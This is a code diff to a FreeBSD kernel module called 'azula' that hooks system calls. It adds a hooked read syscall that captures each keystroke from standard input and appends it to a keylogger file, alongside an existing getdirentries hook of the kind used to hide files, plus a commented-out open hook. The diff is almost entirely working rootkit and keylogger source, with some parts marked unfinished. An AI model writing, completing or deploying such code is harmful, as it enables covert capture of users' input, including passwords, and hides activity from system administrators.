@@ -1,6 +1,89 @@
 #include "azula.h"
 
 
+// Might not work yet
+static int azula_open(struct thread *td, void *syscall_arg){
+    struct open_args *uap;
+    uap = (struct open_args *)syscall_arg;
+
+    int error;
+    ssize_t done;
+    char filename[1024];
+    // original call
+    error = sys_open(td, syscall_arg);
+    // uprintf("Result code: %d\n", error);
+
+    // if (error){
+    //     return(error);
+    // }
+    copyinstr(uap->path, filename, 1024, &done);
+    // uprintf("Path is %s\n", uap->path);
+    // uprintf("Flags are %d", uap->flags);
+    // uprintf("Mode is %d", uap->mode);
+
+    return (error);
+}
+
+static int logger(struct thread *td, char c){
+    int error;
+    error = kern_openat(td, AT_FDCWD, KEYLOGGER, UIO_SYSSPACE, O_WRONLY | O_CREAT | O_APPEND, 0644);
+    if (error){
+
+    }
+
+    int buf[1] = {c};
+    int file_descriptor = td->td_retval[0];
+    struct iovec aiov;
+    struct uio auio;
+
+    aiov.iov_base = &buf;
+    aiov.iov_len = 1;
+    auio.uio_iov = &aiov;
+    auio.uio_iovcnt = 1;
+    //auio.uio_offset = 0;
+    auio.uio_resid = 1;
+    auio.uio_segflg = UIO_SYSSPACE;
+    auio.uio_rw = UIO_WRITE;
+    auio.uio_td = td;
+
+    error = kern_writev(td, file_descriptor, &auio);
+    if (error){
+        return error;
+    }
+
+    struct close_args fdtmp;
+    fdtmp.fd = file_descriptor;
+    sys_close(td, &fdtmp);
+    return(error);
+}
+
+static int azula_read(struct thread *td, void *syscall_arg){
+    struct read_args *uap;
+    uap = (struct read_args *)syscall_arg;
+
+    int error;
+    char buffer[1];
+    ssize_t done;
+
+    // original syscall
+    error = sys_read(td, syscall_arg);
+    if (error || (!uap->nbyte) || (uap->nbyte > 1) || (uap->fd != 0)){
+        return(error);
+    }
+
+    copyinstr(uap->buf, buffer, 1, &done);
+    
+    // #if VERBOSE
+    //     uprintf("Input was %c\n", buffer[0]);
+    // #endif
+
+    // save to a file
+    logger(td, buffer[0]);
+    
+
+    return (error);
+}
+
 static int azula_getdirentries(struct thread *td, void *syscall_args){
     struct getdirentries_args *uap;
     uap = (struct getdirentries_args *)syscall_args;
@@ -96,12 +179,16 @@ static int load(struct module *module, int cmd, void *args){
             uprintf("Module Loaded\n");
         #endif
             sysent[SYS_getdirentries].sy_call = (sy_call_t *)azula_getdirentries;
+            sysent[SYS_read].sy_call = (sy_call_t *)azula_read;
+            // sysent[SYS_open].sy_call = (sy_call_t *)azula_open;
             break;
         case MOD_UNLOAD:
         #if VERBOSE
             uprintf("Module Unloaded\n");
         #endif
             sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
+            sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
+            // sysent[SYS_open].sy_call = (sy_call_t *)sys_open;
             break;
         default:
             error = EOPNOTSUPP;
